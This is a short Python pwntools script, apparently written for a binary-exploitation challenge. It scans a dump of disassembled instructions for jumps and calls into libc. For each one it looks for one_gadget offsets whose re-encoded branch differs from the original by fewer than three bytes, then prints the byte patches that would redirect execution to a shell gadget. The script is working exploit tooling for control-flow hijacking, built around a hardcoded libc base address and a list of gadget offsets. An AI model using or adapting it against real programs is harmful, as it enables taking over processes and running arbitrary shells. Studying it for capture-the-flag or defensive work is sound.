from pwn import *
import json
import math
libc_base = 0x00007ffff7d91000
one_gadgets = [330295, 330307, 330328, 330336, 527427, 527440, 527445, 527450, 965873, 965877, 965880, 1104834, 1104842, 1104847, 1104857]
context.arch = 'amd64'
addrs = []
bs = []
def shit(ins, t):
    # return
    insText = ins['instr']
    #print(ins)
   # print(t)
    idx = insText.index('0x')
    #print(insText)
    callAddr = int(insText[idx:idx+14], 16) - libc_base
    addr = int(ins['address'], 16)
    minz = 0xffffff
    x = 0
    ca = 0

    for gadget in one_gadgets:
        xxx = abs(abs(addr-callAddr) - abs(addr-gadget))
        if xxx < 0xffffffff:
            minz = xxx
            if minz < 0xfffffffff and len(ins['data']) > 3:
                
                dl = ins['data']
                kek = asm(f'{t} {hex(gadget-addr+0x10)}', vma=0x10)
                kek2 = bytes.fromhex(dl)
                if len(kek) != len(kek2):
                    continue
                num = 0
                idxx = -1
                for i in range(len(kek)):
                    if kek[i] != kek2[i]:
                        if idxx == -1:
                            idxx = i
                        num +=1
                if num < 3:
                    print(ins)
                    print(f'calladdr: {hex(callAddr)}, gadget = {hex(gadget)}, diff: {hex(minz)}')
                    print(f'new code: {kek}, oldcode: {kek2}, diff bytes: {num}')
                    addrs.append(int(ins['address'],16)+idxx)
                    bs.append(kek[idxx:idxx+num])
                   
                    print(f"{addrs[-1]}, {bs[-1]}")
                    
     
                #print(kek)

with open('instructions.txt', 'r') as f:
    for line in f:
        ins = json.loads(line.strip())
        
        insText = ins['instr']
        # print(insText)
        try:
            optCodeIdx = insText.index(' ')
        except Exception as a:
            #print(a)
            continue

        if insText.startswith(('jne', 'je', 'jmp', 'call', 'jae', 'ja', 'jg', 'jbe', 'jle', 'js', 'jb')) and ('0x7f' in insText and not 'QWORD' in insText):
            shit(ins, insText[:optCodeIdx])



print(addrs)
print(bs)